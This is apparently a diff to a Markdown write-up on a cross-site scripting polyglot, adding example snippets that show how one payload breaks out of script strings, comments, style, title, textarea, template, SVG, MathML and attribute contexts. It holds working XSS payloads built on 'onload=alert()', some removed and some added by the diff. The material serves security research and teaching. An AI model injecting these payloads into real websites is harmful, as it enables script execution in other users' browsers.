@@ -43,15 +43,6 @@ Let's count how many contexts are there on the page
 </script>
 ```
 
-- Result of stand-alone payload `"%0Aalert()//`
-
-```html
-<script>
-    injection = ""
-alert()//";
-</script>
-```
-
 - Polyglot result
 
 ```html
@@ -72,15 +63,6 @@ onload=alert()//&gt;&lt;/svg&gt;";
 </script>
 ```
 
-- Result of stand-alone payload `` `%0Aalert()// ``
-
-```html
-<script>
-    injection = ``
-alert()//`;
-</script>
-```
-
 - Polyglot result
 
 ```html
@@ -96,11 +78,9 @@ onload=alert()//&gt;&lt;/svg&gt;`;
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<script>
+    // payload
+</script>
 ```
 
 - Polyglot result
@@ -118,11 +98,9 @@ onload=alert()//&gt;&lt;/svg&gt;
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<script>
+    /* payload */
+</script>
 ```
 
 - Polyglot result
@@ -140,18 +118,14 @@ onload=alert()//&gt;&lt;/svg&gt; */
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<style>
+payload</style>
 ```
 
 - Polyglot result
 
 ```html
 <style>
-* {  /* REDACTED */ }
 "
 x=//`//</style></title></math></select></template></textarea><svg x=*/
 onload=alert()//></svg></style>
@@ -162,11 +136,7 @@ onload=alert()//></svg></style>
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<title>2021's vector to rule them all - payload</title></head>
 ```
 
 - Polyglot result
@@ -182,11 +152,8 @@ onload=alert()//></svg></title></head>
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<main>    payload
+    <select>
 ```
 
 - Polyglot result
@@ -203,11 +170,7 @@ onload=alert()//></svg>
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<select><option>payload</option></select>
 ```
 
 - Polyglot result
@@ -223,11 +186,7 @@ onload=alert()//></svg></option></select>
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<textarea>payload</textarea>
 ```
 
 - Polyglot result
@@ -243,11 +202,7 @@ onload=alert()//></svg></textarea>
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<img src="payload" alt="" />
 ```
 
 - Polyglot result
@@ -263,19 +218,15 @@ onload=alert()//></svg>" alt="" />
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
- <template>"
-x=//`//</style></title></math></select></template></textarea><svg x=*/
-onload=alert()//></svg></template>
+<template>payload</template>
 ```
 
 - Polyglot result
 
 ```html
+<template>"
+x=//`//</style></title></math></select></template></textarea><svg x=*/
+onload=alert()//></svg></template>
 ```
 
 ### Context #12: HTML SVG
@@ -283,11 +234,7 @@ onload=alert()//></svg></template>
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<svg>payload</svg>
 ```
 
 - Polyglot result
@@ -303,11 +250,13 @@ onload=alert()//></svg></svg>
 - Code snippet
 
 ```html
+<math>payload</math>
 ```
 
-- Result of stand-alone payload ``
+- Result of stand-alone payload `</math><svg+onload=alert()>`
 
 ```html
+<math></math><svg onload=alert()></math>
 ```
 
 - Polyglot result
@@ -323,11 +272,7 @@ onload=alert()//></svg></math>
 - Code snippet
 
 ```html
-```
-
-- Result of stand-alone payload ``
-
-```html
+<iframe data-injection="payload" src="data:text/html,<h1>Ignore me"></iframe>
 ```
 
 - Polyglot result
